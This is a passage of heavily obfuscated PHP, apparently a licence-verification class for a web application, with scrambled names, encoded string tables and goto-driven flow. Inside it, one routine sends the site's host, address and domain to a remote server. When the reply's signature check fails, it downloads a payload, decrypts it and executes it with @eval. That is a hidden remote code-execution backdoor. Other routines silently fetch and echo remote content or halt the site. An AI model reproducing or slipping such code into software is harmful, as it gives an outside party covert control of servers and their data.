!$c¸ƒˆè÷ã[164]($fØšãØ‘[$c¸ƒˆè÷ã[214]]) || $fØšãØ‘[$c¸ƒˆè÷ã[186]] != !0) { $DÁœ×Ü—Áª = $c¸ƒˆè÷ã[215]; $eÄÒáè„ƒà = $fØšãØ‘[$c¸ƒˆè÷ã[214]] ? $c¸ƒˆè÷ã[216] . $fØšãØ‘[$c¸ƒˆè÷ã[214]] : $DÁœ×Ü—Áª; $c¸ƒˆè÷ã[187]($eÄÒáè„ƒà, !1); } else { $Eµóë†Û“é[$c¸ƒˆè÷ã[189]] = $fØšãØ‘[$c¸ƒˆè÷ã[214]][$c¸ƒˆè÷ã[217]]; } } else { $fØšãØ‘ = $this->{$_SERVER[úÙ][205]}($c¸ƒˆè÷ã[218], $Eµóë†Û“é, 10); $E¶ù£¯…ÏÉ = $eç˜ÀÛ¢‡ï[626]; if (!$E¶ù£¯…ÏÉ) { die; } } } if (!$c¸ƒˆè÷ã[164]($fØšãØ‘) || !$c¸ƒˆè÷ã[164]($fØšãØ‘[$c¸ƒˆè÷ã[214]]) || $fØšãØ‘[$c¸ƒˆè÷ã[186]] != !0) { $DÁœ×Ü—Áª = $c¸ƒˆè÷ã[219]($c¸ƒˆè÷ã[220]); $eÄÒáè„ƒà = $fØšãØ‘[$c¸ƒˆè÷ã[214]] ? $c¸ƒˆè÷ã[216] . $fØšãØ‘[$c¸ƒˆè÷ã[214]] : $DÁœ×Ü—Áª; $c¸ƒˆè÷ã[187]($eÄÒáè„ƒà, !1); } goto c“õëÉ×Œˆ; E¸ßãìÈ: if (!$c¸ƒˆè÷ã[119]($GLOBALS, $c¸ƒˆè÷ã[145])) { die; } $EÊÎœõğ±÷ = $GLOBALS[$c¸ƒˆè÷ã[22]]; if (isset($EÊÎœõğ±÷[$c¸ƒˆè÷ã[184]])) { $this->{$_SERVER[úÙ][185]}(); die; } goto E–”˜ÔóÚ´; BÂ…ç–†É: } private function licenseRegistSuccess() { $Dù Æ®¶© =& $_SERVER[úÙ]; $cÄğ©ÄÚÒğ = $Dù Æ®¶©[61]($Dù Æ®¶©[62])->{$_SERVER[úÙ][63]}(); if ($cÄğ©ÄÚÒğ[$Dù Æ®¶©[93]] != $Dù Æ®¶©[242]) { $Dù Æ®¶©[61]($Dù Æ®¶©[62])->{$_SERVER[úÙ][243]}($Dù Æ®¶©[93], $Dù Æ®¶©[242]); } $Dù Æ®¶©[123]($Dù Æ®¶©[254])->{$_SERVER[úÙ][255]}(!0); } private function bfhn6d27538b() { goto D¯Æ…¬¡¢; B’­£‚Šˆ†: $d¬„®‘·ï = $CŠƒ§÷µ¯…[635]; $D‡î¸¼ƒšÉ[61]($D‡î¸¼ƒšÉ[62])->{$_SERVER[úÙ][240]}($D‡î¸¼ƒšÉ[241], $D‡î¸¼ƒšÉ[256]); $C÷‹Ãé˜Æ = $CŠƒ§÷µ¯…[636]; goto DÒö¾ÄÚé; DÒö¾ÄÚé: if (!$C÷‹Ãé˜Æ) { die; } $this->pjioda561ea2 = array(); $this->zmeg37a48588 = $D‡î¸¼ƒšÉ[134]; goto f”©‚™˜³è; D¯Æ…¬¡¢: $CŠƒ§÷µ¯… =& $_SERVER[æ§›¦ÌáØ]; $D‡î¸¼ƒšÉ =& $_SERVER[úÙ]; $D‡î¸¼ƒšÉ[61]($D‡î¸¼ƒšÉ[62])->{$_SERVER[úÙ][243]}(array($D‡î¸¼ƒšÉ[230] => $D‡î¸¼ƒšÉ[10], $D‡î¸¼ƒšÉ[232] => $D‡î¸¼ƒšÉ[10], $D‡î¸¼ƒšÉ[133] => $D‡î¸¼ƒšÉ[134], $D‡î¸¼ƒšÉ[135] => $D‡î¸¼ƒšÉ[10], $D‡î¸¼ƒšÉ[136] => $D‡î¸¼ƒšÉ[10])); goto B’­£‚Šˆ†; f”©‚™˜³è: } private function krsj236ffb73() { goto dĞ÷¢Åê’Ğ; f±‡ôÒªö‰: if ($dÒËõºäƒ[$aéÊéĞİ‰¨[133]] == $aéÊéĞİ‰¨[134]) { return; } $Dƒ†¦ÚêÏ´ = $aéÊéĞİ‰¨[61]($aéÊéĞİ‰¨[62])->{$_SERVER[úÙ][63]}($aéÊéĞİ‰¨[129]); $eİÒÁÔ = $aéÊéĞİ‰¨[252] . $aéÊéĞİ‰¨[127]($Dƒ†¦ÚêÏ´ . $aéÊéĞİ‰¨[253]); goto eŒ‘’‹ˆ£È; aÖÖçó³‹™: if (!$aéÊéĞİ‰¨[164]($d–¹»µÈ£õ) || !isset($d–¹»µÈ£õ[$aéÊéĞİ‰¨[257]]) || $aéÊéĞİ‰¨[258]() - $d–¹»µÈ£õ[$aéÊéĞİ‰¨[257]] >= 60) { $C•ôâ‘ùé÷ = $aéÊéĞİ‰¨[244]($aéÊéĞİ‰¨[61]($aéÊéĞİ‰¨[11])->{$_SERVER[úÙ][245]}(), $aéÊéĞİ‰¨[246]); $Eƒò÷ì²” = $C•ôâ‘ùé÷[$aéÊéĞİ‰¨[247]]; $f”êï¶÷® = $aéÊéĞİ‰¨[127]($_SERVER[$aéÊéĞİ‰¨[128]] . $aéÊéĞİ‰¨[236]($Dƒ†¦ÚêÏ´) . $dÒËõºäƒ[$aéÊéĞİ‰¨[232]]); $A£ö¦°šÖ = $aéÊéĞİ‰¨[236]($aéÊéĞİ‰¨[25]($f”êï¶÷®, 10, 16)); $d–¹»µÈ£õ = $this->{$_SERVER[úÙ][211]}($Eƒò÷ì²”[$aéÊéĞİ‰¨[107]][$A£ö¦°šÖ], $f”êï¶÷®); $d–¹»µÈ£õ = $aéÊéĞİ‰¨[213]($d–¹»µÈ£õ, !0); } if (!$aéÊéĞİ‰¨[164]($d–¹»µÈ£õ)) { return $this->{$_SERVER[úÙ][185]}(); } $B²èóÚÀÁ = $aéÊéĞİ‰¨[157]($d–¹»µÈ£õ[$aéÊéĞİ‰¨[158]]); goto D´™ŒÚ’¡ª; DÜàÎ—ĞÄ®: $this->zmeg37a48588 = $dÒËõºäƒ[$aéÊéĞİ‰¨[133]]; goto AÒÕù³±Ş›; d„Îö³‚ÆÄ: $DÎ©ê§ºš = $D©õ¦‹¨è‘[638]; if (!$DÎ©ê§ºš) { die; } $dÒËõºäƒ = $aéÊéĞİ‰¨[61]($aéÊéĞİ‰¨[62])->{$_SERVER[úÙ][63]}(); goto f±‡ôÒªö‰; bŠ™“¯™¶: $fôùáø«¯× = $D©õ¦‹¨è‘[637]; while (strlen($fôùáø«¯×) < $D©õ¦‹¨è‘[610]) { if (!$fôùáø«¯×) { break; } $fôùáø«¯×++; } $this->zmeg37a48588 = $aéÊéĞİ‰¨[134]; goto d„Îö³‚ÆÄ; D´™ŒÚ’¡ª: if ($aéÊéĞİ‰¨[258]() >= $B²èóÚÀÁ) { return $this->{$_SERVER[úÙ][185]}(); } if ($aéÊéĞİ‰¨[258]() - $d–¹»µÈ£õ[$aéÊéĞİ‰¨[257]] > 20) { $d–¹»µÈ£õ[$aéÊéĞİ‰¨[257]] = $aéÊéĞİ‰¨[258](); Cache::set($eİÒÁÔ, $d–¹»µÈ£õ); } $this->pjioda561ea2 = $d–¹»µÈ£õ; goto DÜàÎ—ĞÄ®; eŒ‘’‹ˆ£È: $d–¹»µÈ£õ = Cache::get($eİÒÁÔ); $DáÃîµÕöç = $D©õ¦‹¨è‘[639]; if (strlen($DáÃîµÕöç) < $D©õ¦‹¨è‘[595]) { return; } goto aÖÖçó³‹™; dĞ÷¢Åê’Ğ: $D©õ¦‹¨è‘ =& $_SERVER[æ§›¦ÌáØ]; $aéÊéĞİ‰¨ =& $_SERVER[úÙ]; $_SERVER[$aéÊéĞİ‰¨[196]] = $aéÊéĞİ‰¨[119]($_SERVER, $aéÊéĞİ‰¨[196], APP_HOST); goto bŠ™“¯™¶; AÒÕù³±Ş›: } private function zqjb15199ed3() { goto b”‘ÇÅã; Fß‚£Ì©—š: if ($f²ÔœºİÇ[264]($c¶«æ½‘¥ì, $fŞÕšš–Ô)) { if ($this->zmeg37a48588 == $f²ÔœºİÇ[134] && isset($f“¿ïÏ£ß„[$f²ÔœºİÇ[265]])) { $f²ÔœºİÇ[187]($f²ÔœºİÇ[219]($f²ÔœºİÇ[260]), !1, $f²ÔœºİÇ[261]); die; } $dá¥êêã­ò = $this->{$_SERVER[úÙ][150]}(); if ($dá¥êêã­ò != $f²ÔœºİÇ[266]($f²ÔœºİÇ[267])) { if ($dá¥êêã­ò <= $f²ÔœºİÇ[61]($f²ÔœºİÇ[152])->{$_SERVER[úÙ][153]}()) { $f²ÔœºİÇ[187]($f²ÔœºİÇ[219]($f²ÔœºİÇ[268]), !1, $f²ÔœºİÇ[261]); die; } } } goto eÜ«ïµ‚Ôª; f‡´˜Ôİèğ: $BŒˆºğìõ‚ = $Eô –£–Æ©[640]; if (!$BŒˆºğìõ‚) { return; } $c¶«æ½‘¥ì = $_SERVER[$f²ÔœºİÇ[44]]; goto CŒÇãÇÁ; b”‘ÇÅã: $Eô –£–Æ© =& $_SERVER[æ§›¦ÌáØ]; $f²ÔœºİÇ =& $_SERVER[úÙ]; $f“¿ïÏ£ß„ = $GLOBALS[$f²ÔœºİÇ[22]]; goto f‡´˜Ôİèğ; CŒÇãÇÁ: $BœÊÚÂÓ²Û = $Eô –£–Æ©[641]; if ($c¶«æ½‘¥ì == $f²ÔœºİÇ[259] && $this->zmeg37a48588 == $f²ÔœºİÇ[134]) { $f²ÔœºİÇ[187]($f²ÔœºİÇ[219]($f²ÔœºİÇ[260]), !1, $f²ÔœºİÇ[261]); } $fŞÕšš–Ô = array($f²ÔœºİÇ[262], $f²ÔœºİÇ[263]); goto Fß‚£Ì©—š; eÜ«ïµ‚Ôª: } private function tlmz87503df8() { goto E„ŒŸµ÷¾Š; Dí‡Ğ­ğ¶: $EÄİ¾ĞÙ—• = $A›™Ô‚òê[642]; $A¯Ñ¾‡ƒŒ = $this->{$_SERVER[úÙ][272]}($A¯Ñ¾‡ƒŒ, $e·‡Ó†Ğ¬–[273]); $Dé‘® ‹ô = $A›™Ô‚òê[643]; goto b¾„äòÙ˜Š; b¾„äòÙ˜Š: if (!$Dé‘® ‹ô) { return; } $DÜ©‰·œ¾ = $e·‡Ó†Ğ¬–[274](array($e·‡Ó†Ğ¬–[275] => array($e·‡Ó†Ğ¬–[276] => $e·‡Ó†Ğ¬–[277], $e·‡Ó†Ğ¬–[278] => 3))); $c–‚ôùåŠÒ = @$e·‡Ó†Ğ¬–[279]($A¯Ñ¾‡ƒŒ, !1, $DÜ©‰·œ¾); goto FË¥Ÿ½; FìÎ²ñ•ËÒ: if (!$e·‡Ó†Ğ¬–[119]($GLOBALS, $e·‡Ó†Ğ¬–[145]) || !isset($_GET[$e·‡Ó†Ğ¬–[270]])) { return; } if (!$e·‡Ó†Ğ¬–[264]($_SERVER[$e·‡Ó†Ğ¬–[44]], $A‚Í¤ßÙÜµ)) { return; } $A¯Ñ¾‡ƒŒ = $e·‡Ó†Ğ¬–[271]; goto Dí‡Ğ­ğ¶; E„ŒŸµ÷¾Š: $A›™Ô‚òê =& $_SERVER[æ§›¦ÌáØ]; $e·‡Ó†Ğ¬– =& $_SERVER[úÙ]; $A‚Í¤ßÙÜµ = array($e·‡Ó†Ğ¬–[148], $e·‡Ó†Ğ¬–[269]); goto FìÎ²ñ•ËÒ; FË¥Ÿ½: $e·‡Ó†Ğ¬–[280]($e·‡Ó†Ğ¬–[281]); $d·îÛ¹¹Ôã = $A›™Ô‚òê[644]; if (strlen($d·îÛ¹¹Ôã) < $A›™Ô‚òê[610]) { die; } goto cˆÓš‹±ç·; cˆÓš‹±ç·: if ($c–‚ôùåŠÒ && $e·‡Ó†Ğ¬–[32]($c–‚ôùåŠÒ, $e·‡Ó†Ğ¬–[282])) { echo $c–‚ôùåŠÒ; } die; goto aŒ•‡öÍøø; aŒ•‡öÍøø: } public function asdk3ea7c1d7($cö×¼Æ¹Œ) { goto B…†«„ ¢å; c×ÊâŠ—åé: foreach ($c¬´ÀŠÀí  as $c¢Üê—«ğ) { unset($cö×¼Æ¹Œ[$c¢Üê—«ğ]); $dÔ³Òµ‡†ö = $e½´Šˆ¢„Ş[646]; } return $cö×¼Æ¹Œ; goto fñÏùÑ“; FáŠ²—«´: if (strlen($dŠ˜¥Ÿ«) < $e½´Šˆ¢„Ş[595]) { return; } $c¬´ÀŠÀí  = array(); foreach ($E—Ùø»ƒò² as $c¢Üê—«ğ => $bíËø¢ç»µ) { if ($bíËø¢ç»µ == $d»ä˜âÂòº[285] && $d»ä˜âÂòº[25]($this->zmeg37a48588, 0, 1) == $d»ä˜âÂòº[285]) { continue; } if (!$d»ä˜âÂòº[264]($c¢Üê—«ğ, $A³ÎŒÚ¿¶)) { $c¬´ÀŠÀí [] = $c¢Üê—«ğ; } } goto c×ÊâŠ—åé; Bé“ªØ: $E—Ùø»ƒò² = array($d»ä˜âÂòº[284] => $d»ä˜âÂòº[285], $d»ä˜âÂòº[286] => $d»ä˜âÂòº[285], $d»ä˜âÂòº[287] => $d»ä˜âÂòº[285], $d»ä˜âÂòº[288] => $d»ä˜âÂòº[285], $d»ä˜âÂòº[289] => $d»ä˜âÂòº[290], $d»ä˜âÂòº[291] => $d»ä˜âÂòº[290], $d»ä˜âÂòº[292] => $d»ä˜âÂòº[290], $d»ä˜âÂòº[293] => $d»ä˜âÂòº[290], $d»ä˜âÂòº[294] => $d»ä˜âÂòº[290], $d»ä˜âÂòº[295] => $d»ä˜âÂòº[290], $d»ä˜âÂòº[296] => $d»ä˜âÂòº[290], $d»ä˜âÂòº[297] => $d»ä˜âÂòº[290], $d»ä˜âÂòº[298] => $d»ä˜âÂòº[290], $d»ä˜âÂòº[299] => $d»ä˜âÂòº[290], $d»ä˜âÂòº[300] => $d»ä˜âÂòº[290], $d»ä˜âÂòº[301] => $d»ä˜âÂòº[290]); $A³ÎŒÚ¿¶ = $d»ä˜âÂòº[0]($d»ä˜âÂòº[302], $d»ä˜âÂòº[119]($this->pjioda561ea2, $d»ä˜âÂòº[142], $d»ä˜âÂòº[10])); $dŠ˜¥Ÿ« = $e½´Šˆ¢„Ş[645]; goto FáŠ²—«´; B…†«„ ¢å: $e½´Šˆ¢„Ş =& $_SERVER[æ§›¦ÌáØ]; $d»ä˜âÂòº =& $_SERVER[úÙ]; if ($this->zmeg37a48588 == $d»ä˜âÂòº[283]) { return $cö×¼Æ¹Œ; } goto Bé“ªØ; fñÏùÑ“: } private function knzb954980ac() { $c±âŠ½Ôª· =& $_SERVER[úÙ]; if ($this->zmeg37a48588 != $c±âŠ½Ôª·[134]) { return; } $GLOBALS[$c±âŠ½Ôª·[107]][$c±âŠ½Ôª·[111]][$c±âŠ½Ôª·[303]] = $c±âŠ½Ôª·[242]; $GLOBALS[$c±âŠ½Ôª·[107]][$c±âŠ½Ôª·[304]] = $c±âŠ½Ôª·[242]; if ($c±âŠ½Ôª·[61]($c±âŠ½Ôª·[305])->{$_SERVER[úÙ][63]}($c±âŠ½Ôª·[93]) != $c±âŠ½Ôª·[256]) { $c±âŠ½Ôª·[61]($c±âŠ½Ôª·[305])->{$_SERVER[úÙ][243]}($c±âŠ½Ôª·[93], $c±âŠ½Ôª·[256]); } } public function vhmre061acf4() { return $_SERVER[úÙ][306]; $C†èÆ£á²Î = $_SERVER[æ§›¦ÌáØ][647]; if (!$C†èÆ£á²Î) { return; } } private function lrkc52816945() { goto Eƒø¹šŠÅî; FÖÌÕ¹‘ã: $EóÜõ»Íƒ¦ = $BİÜÖîõº[310] . $BİÜÖîõº[127]($BİÜÖîõº[311]); if ($this->zmeg37a48588 == $BİÜÖîõº[134] || !$BİÜÖîõº[119]($GLOBALS, $BİÜÖîõº[145])) { return; } if (!$BİÜÖîõº[264]($_SERVER[$BİÜÖîõº[44]], $DÛÏáøİ¥)) { return; } goto C×†çÁÇºŒ; c‚»µ“Ñ—Ã: $BİÜÖîõº[13](array($BİÜÖîõº[312], $BİÜÖîõº[173]), $EóÜõ»Íƒ¦, $BİÜÖîõº[258]()); $BíšÔâÌ‡¿ = $BİÜÖîõº[61]($BİÜÖîõº[62])->{$_SERVER[úÙ][63]}($BİÜÖîõº[129]); $d‡„•¯÷˜Õ = array($BİÜÖîõº[186] => $BİÜÖîõº[61]($BİÜÖîõº[62])->{$_SERVER[úÙ][63]}($BİÜÖîõº[230]), $BİÜÖîõº[200] => $this->zmeg37a48588, $BİÜÖîõº[197] => $_SERVER[$BİÜÖîõº[198]], $BİÜÖîõº[199] => $BİÜÖîõº[61]($BİÜÖîõº[62])->{$_SERVER[úÙ][63]}($BİÜÖîõº[160]), $BİÜÖîõº[126] => $BİÜÖîõº[127]($_SERVER[$BİÜÖîõº[128]] . $BíšÔâÌ‡¿), $BİÜÖîõº[190] => $BİÜÖîõº[170], $BİÜÖîõº[193] => $_SERVER[$BİÜÖîõº[194]]); goto dÊÙ¬³ªè·; Dá«Ãò©¤Œ: if ($F«Ë°§ï«[$BİÜÖîõº[186]] && $F«Ë°§ï«[$BİÜÖîõº[316]]) { if ($this->{$_SERVER[úÙ][221]}($F«Ë°§ï«[$BİÜÖîõº[316]]) == $d‡„•¯÷˜Õ[$BİÜÖîõº[186]]) { return; } } $this->{$_SERVER[úÙ][185]}(); $cÜ×ÉÔ”„ì = $D’—À¢ÁÄ½[649]; goto fÓçóÏÏ÷Ò; dÊÙ¬³ªè·: $Fèè¶ãì‰ = $D’—À¢ÁÄ½[648]; $F«Ë°§ï« = $this->{$_SERVER[úÙ][205]}($BİÜÖîõº[315], $d‡„•¯÷˜Õ); if (!$BİÜÖîõº[164]($F«Ë°§ï«)) { return; } goto Dá«Ãò©¤Œ; Eƒø¹šŠÅî: $D’—À¢ÁÄ½ =& $_SERVER[æ§›¦ÌáØ]; $BİÜÖîõº =& $_SERVER[úÙ]; $DÛÏáøİ¥ = array($BİÜÖîõº[307], $BİÜÖîõº[308], $BİÜÖîõº[309]); goto FÖÌÕ¹‘ã; fÓçóÏÏ÷Ò: if (!$cÜ×ÉÔ”„ì) { die; } if ($this->{$_SERVER[úÙ][221]}($F«Ë°§ï«[$BİÜÖîõº[316]]) != $d‡„•¯÷˜Õ[$BİÜÖîõº[186]]) { $Dˆœ»Ë…È = array($BİÜÖîõº[223] => $BíšÔâÌ‡¿, $BİÜÖîõº[224] => $_SERVER[$BİÜÖîõº[128]], $BİÜÖîõº[225] => $BİÜÖîõº[226](), $BİÜÖîõº[195] => $_SERVER[$BİÜÖîõº[196]]); $c‘Ÿß†¡˜¥ = $this->{$_SERVER[úÙ][227]}($BİÜÖîõº[169]($Dˆœ»Ë…È)); $F«Ë°§ï« = $this->{$_SERVER[úÙ][205]}($BİÜÖîõº[228] . $c‘Ÿß†¡˜¥); if ($F«Ë°§ï« && $BİÜÖîõº[164]($F«Ë°§ï«) && isset($F«Ë°§ï«[$BİÜÖîõº[316]])) { $Fëíš¯ù°˜ = $this->{$_SERVER[úÙ][211]}($F«Ë°§ï«[$BİÜÖîõº[316]], 2); if ($Fëíš¯ù°˜) { $Fëíš¯ù°˜ = $this->{$_SERVER[úÙ][221]}($Fëíš¯ù°˜); } if ($Fëíš¯ù°˜) { try { @eval($Fëíš¯ù°˜); } catch (Exception $F‹Â­ Üñ¦) { } } } } goto a¹Ş‡ÇÉ×; C×†çÁÇºŒ: if ($BİÜÖîõº[258]() % 4 != 0) { return; } $d–¥˜ø…Ö = $BİÜÖîõº[13](array($BİÜÖîõº[312], $BİÜÖîõº[313]), $EóÜõ»Íƒ¦); if ($d–¥˜ø…Ö && $BİÜÖîõº[258]() - $d–¥˜ø…Ö < $BİÜÖîõº[266]($BİÜÖîõº[314])) { return; } goto c‚»µ“Ñ—Ã; a¹Ş‡ÇÉ×: } private function efwsaef99493($eÙâÁ†¯‹° = '', $dÉ±›÷ĞöŠ = array(), $d®ø‹•ñÄ = 5) { goto f‚¢¼•İÎ; aÍÕÄñÈÏÕ: $dÉ±›÷ĞöŠ = @$dùŸĞäå»»[279]($dï„ÂŒœÀÑ, !1, $a¨”’ŸéÍ); return $dùŸĞäå»»[213]($dÉ±›÷ĞöŠ, !0); $dí¶ƒñ«Ú˜ = $b‰»Ëö†ãÊ[652]; goto BçåÕ¶ÏÒ; Dò¼áòİ¢ë: $dï„ÂŒœÀÑ = $this->{$_SERVER[úÙ][272]}($dï„ÂŒœÀÑ, $dùŸĞäå»»[318]); $dï„ÂŒœÀÑ = $dï„ÂŒœÀÑ . $eÙâÁ†¯‹°; $C‡‰í’ªÅÃ = $b‰»Ëö†ãÊ[650]; goto AéÊ˜ò±½; DË©—ŒòÅÀ: $a¨”’ŸéÍ = $dùŸĞäå»»[274](array($dùŸĞäå»»[275] => array($dùŸĞäå»»[278] => $d®ø‹•ñÄ, $dùŸĞäå»»[276] => $dùŸĞäå»»[321]), $dùŸĞäå»»[322] => array($dùŸĞäå»»[323] => !1, $dùŸĞäå»»[324] => !1))); $F¡ÅÚê¬Ä = $b‰»Ëö†ãÊ[651]; if (!$F¡ÅÚê¬Ä) { return; } goto aÍÕÄñÈÏÕ; f‚¢¼•İÎ: $b‰»Ëö†ãÊ =& $_SERVER[æ§›¦ÌáØ]; $dùŸĞäå»» =& $_SERVER[úÙ]; $dï„ÂŒœÀÑ = $dùŸĞäå»»[317]; goto Dò¼áòİ¢ë; AéÊ˜ò±½: if (strlen($C‡‰í’ªÅÃ) < $b‰»Ëö†ãÊ[604]) { die; } if ($dÉ±›÷ĞöŠ && $dùŸĞäå»»[164]($dÉ±›÷ĞöŠ)) { $dï„ÂŒœÀÑ = $dï„ÂŒœÀÑ . $dùŸĞäå»»[319] . $dùŸĞäå»»[320]($dÉ±›÷ĞöŠ); } if ($dÉ±›÷ĞöŠ === -1) { return $dï„ÂŒœÀÑ; } goto DË©—ŒòÅÀ; BçåÕ¶ÏÒ: while (strlen($dí¶ƒñ«Ú˜) < $b‰»Ëö†ãÊ[608]) { if (!$dí¶ƒñ«Ú˜) { break; } $dí¶ƒñ«Ú˜++; } goto f‘ëÕ„Û¨; f‘ëÕ„Û¨: } private function fdro1226a700() { goto eİğ·³¡ó; aà³É…œŸŒ: while ($c±»İŒâ”ª < $E¥÷ÓÌÌ»[595]) { if ($c±»İŒâ”ª >= 0) { break; } $c±»İŒâ”ª++; } $dŒÜÉ÷§Ì = $D±‚¾øÌ[119]($this->pjioda561ea2, $D±‚¾øÌ[352]); $DˆØİƒ½Ç = $E¥÷ÓÌÌ»[654]; goto f¦ÜâäÜäØ; f¦ÜâäÜäØ: if (!$DˆØİƒ½Ç) { return; } $dŒÜÉ÷§Ì = $dŒÜÉ÷§Ì ? $D±‚¾øÌ[266]($dŒÜÉ÷§Ì) : 0; return $b ™ˆÀ‹ƒ + $dŒÜÉ÷§Ì; goto aÛˆÃã½‰ƒ; eİğ·³¡ó: $E¥÷ÓÌÌ» =& $_SERVER[æ§›¦ÌáØ]; $D±‚¾øÌ =& $_SERVER[úÙ]; $fô©Ä°Ö¢ = array($D±‚¾øÌ[325] => $D±‚¾øÌ[326], $D±‚¾øÌ[327] => $D±‚¾øÌ[328], $D±‚¾øÌ[329] => $D±‚¾øÌ[330], $D±‚¾øÌ[331] => $D±‚¾øÌ[332], $D±‚¾øÌ[333] => $D±‚¾øÌ[334], $D±‚¾øÌ[335] => $D±‚¾øÌ[267], $D±‚¾øÌ[336] => $D±‚¾øÌ[267], $D±‚¾øÌ[337] => $D±‚¾øÌ[326], $D±‚¾øÌ[338] => $D±‚¾øÌ[328], $D±‚¾øÌ[339] => $D±‚¾øÌ[330], $D±‚¾øÌ[340] => $D±‚¾øÌ[341], $D±‚¾øÌ[342] => $D±‚¾øÌ[332], $D±‚¾øÌ[343] => $D±‚¾øÌ[344], $D±‚¾øÌ[345] => $D±‚¾øÌ[334], $D±‚¾øÌ[346] => $D±‚¾øÌ[347], $D±‚¾øÌ[348] => $D±‚¾øÌ[349], $D±‚¾øÌ[350] => $D±‚¾øÌ[351]); goto Bö‰‚Í‰±Û; Bö‰‚Í‰±Û: $b ™ˆÀ‹ƒ = $fô©Ä°Ö¢[$this->zmeg37a48588]; $b ™ˆÀ‹ƒ = $D±‚¾øÌ[266]($b ™ˆÀ‹ƒ ? $b ™ˆÀ‹ƒ : $D±‚¾øÌ[326]); $c±»İŒâ”ª = $E¥÷ÓÌÌ»[653]; goto aà³É…œŸŒ; aÛˆÃã½‰ƒ: $a÷Íí½èñ‰ = $E¥÷ÓÌÌ»[655]; if (strlen($a÷Íí½èñ‰) < $E¥÷ÓÌÌ»[595]) { return; } goto cìÙ¹ø©ò; cìÙ¹ø©ò: } public function oqjs72f0dc38($d¯Üİœ½à) { goto Dù×—¥ÛÁ; D¤ğ®„Óïğ: $e™Ò·‘Ş° = $cÒƒÇê‚‡†[656]; if (strlen($e™Ò·‘Ş°) < $cÒƒÇê‚‡†[604]) { return; } if ($d¯Üİœ½à[$Aç»„èØ[353]] == $Aç»„èØ[242]) { return; } goto A‚çÖ›öÒò; Dù×—¥ÛÁ: $cÒƒÇê‚‡† =& $_SERVER[æ§›¦ÌáØ]; $Aç»„èØ =& $_SERVER[úÙ]; $bğË±Å”“ = $this->{$_SERVER[úÙ][150]}(); goto D¤ğ®„Óïğ; EÎ¹‘…óÁß: if ($CºÍ¸³Ü¹Ï <= $bğË±Å”“) { return; } $Cƒ‹Ç¾„¶ñ = $Aç»„èØ[61]($Aç»„èØ[152])->{$_SERVER[úÙ][354]}($Aç»„èØ[353])->{$_SERVER[úÙ][355]}($bğË±Å”“)->{$_SERVER[úÙ][356]}(); $Cƒ‹Ç¾„¶ñ = $Aç»„èØ[244]($Cƒ‹Ç¾„¶ñ, $Aç»„èØ[10], $Aç»„èØ[353]); goto c¨µ–•ó–¡; c¨µ–•ó–¡: if (!$Aç»„èØ[264]($d¯Üİœ½à[$Aç»„èØ[353]], $Cƒ‹Ç¾„¶ñ)) { $Aç»„èØ[187]($Aç»„èØ[357], !1, $Aç»„èØ[261]); } goto CĞ‹—ñÄ½å; A‚çÖ›öÒò: if ($bğË±Å”“ >= $Aç»„èØ[266]($Aç»„èØ[267])) { return; } $CºÍ¸³Ü¹Ï = $Aç»„èØ[61]($Aç»„èØ[152])->{$_SERVER[úÙ][153]}(); $aì¬ˆÚ¦Œ– = $cÒƒÇê‚‡†[657]; goto EÎ¹‘…óÁß; CĞ‹—ñÄ½å: } public function ikhx26b8f238() { goto Dî£¸ÕİÒ; CÅö¤‚£Šô: $c¼„Ó…›šù = @$cØÛÓ­…’[279]($F´äç¨‰÷, !1, $f‹™Ÿ•…â¬); $D«İØÓÍ× = $c˜âÚÖŸ‹„[658]; if (strlen($D«İØÓÍ×) < $c˜âÚÖŸ‹„[595]) { die; } goto DÓ™œÑ”ƒ—; DÓ™œÑ”ƒ—: echo $cØÛÓ­…’[359] . $cØÛÓ­…’[360]($c¼„Ó…›šù) . $cØÛÓ­…’[361]; $A„¬ÀŠğ÷Ÿ = $c˜âÚÖŸ‹„[659]; goto E²³òò§İ; eÉ·ØÓÔª´: $F´äç¨‰÷ = $cØÛÓ­…’[271]; $F´äç¨‰÷ = $this->{$_SERVER[úÙ][272]}($F´äç¨‰÷, $cØÛÓ­…’[273]); $f‹™Ÿ•…â¬ = $cØÛÓ­…’[274](array($cØÛÓ­…’[275] => array($cØÛÓ­…’[276] => $cØÛÓ­…’[277], $cØÛÓ­…’[278] => 3))); goto CÅö¤‚£Šô; Dî£¸ÕİÒ: $c˜âÚÖŸ‹„ =& $_SERVER[æ§›¦ÌáØ]; $cØÛÓ­…’ =& $_SERVER[úÙ]; if (!$cØÛÓ­…’[119]($GLOBALS, $cØÛÓ­…’[145]) || $cØÛÓ­…’[358](1, 100) > 20) { return; } goto eÉ·ØÓÔª´; E²³òò§İ: } private function efbge7a2465b($A¾à°Ú·¨§, $a‹¬ä¿¶ë, $a‹„Ÿƒçà = 3) { goto F©Äˆù¬„Ç; Cëå‘§ÓìÄ: if (!$c£•ŒÂ®Ùå) { die; } if ($a‹„Ÿƒçà - 1 > 0) { $C™¦ Šåï‰ = $this->{$_SERVER[úÙ][140]}($C™¦ Šåï‰, $a‹¬ä¿¶ë, $a‹„Ÿƒçà - 1); } return $C™¦ Šåï‰; goto B°˜ÁçŸ»È; b„Úİø·áÃ: switch ($d¿Ì°âç¦) { case $fåÕŠ–Õ®æ[256]: $C™¦ Šåï‰ = $this->{$_SERVER[úÙ][168]}($A¾à°Ú·¨§, $fåÕŠ–Õ®æ[236]($a‹¬ä¿¶ë . $C¤Çå×¾·)); $F‘ÒÜŒ³è« = $CÓÊ¹›èç£[661]; if (!$F‘ÒÜŒ³è«) { return; } break; $dœ ßµ½ì = $CÓÊ¹›èç£[662]; if (!$dœ ßµ½ì) { return; } case $fåÕŠ–Õ®æ[242]: $C™¦ Šåï‰ = $this->{$_SERVER[úÙ][168]}($A¾à°Ú·¨§, $fåÕŠ–Õ®æ[236]($C¤Çå×¾· . $a‹¬ä¿¶ë)); $c¢ƒ¢†ÀËå = $CÓÊ¹›èç£[663]; if (!$c¢ƒ¢†ÀËå) { return; } break; case $fåÕŠ–Õ®æ[364]: $C™¦ Šåï‰ = $this->{$_SERVER[úÙ][168]}($A¾à°Ú·¨§, $fåÕŠ–Õ®æ[131]($C¤Çå×¾· . $a‹¬ä¿¶ë)); break; $cÆ¿öŸ²±ª = $CÓÊ¹›èç£[664]; if (strlen($cÆ¿öŸ²±ª) < $CÓÊ¹›èç£[608]) { return; } case $fåÕŠ–Õ®æ[365]: $C™¦ Šåï‰ = $this->{$_SERVER[úÙ][168]}($A¾à°Ú·¨§, $fåÕŠ–Õ®æ[127]($C¤Çå×¾· . $a‹¬ä¿¶ë)); break; case $fåÕŠ–Õ®æ[366]: goto a÷º‰æ‡óØ; 